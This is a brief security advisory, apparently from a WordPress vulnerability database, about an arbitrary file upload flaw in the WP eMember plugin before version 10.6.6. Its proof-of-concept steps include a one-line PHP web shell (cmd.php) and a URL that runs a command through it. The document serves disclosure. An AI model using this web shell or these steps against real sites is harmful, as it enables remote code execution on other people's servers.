## WordPress Plugin Vulnerabilities

# WP eMember < 10.6.6 - Admin+ Arbitrary File Upload

### Description

The plugin does not validate files to be uploaded, which could allow admins to upload arbitrary files such as PHP on the server

### Proof of Concept

1. Go to https://example.com/wp-admin/admin.php?page=eMember\_admin\_functions\_menu&tab=2
2. Click the checkbox next to "Enable/Disable eMember Folder Protection" and click "update"
3. Click "Upload a file"
4. Select a PHP file. In this case, use one called `cmd.php` with the content: `<?php echo system($\_GET['cmd']); ?>`
5. Go to https://example.com/wp-content/uploads/emember/downloads/cmd.php?cmd=ls
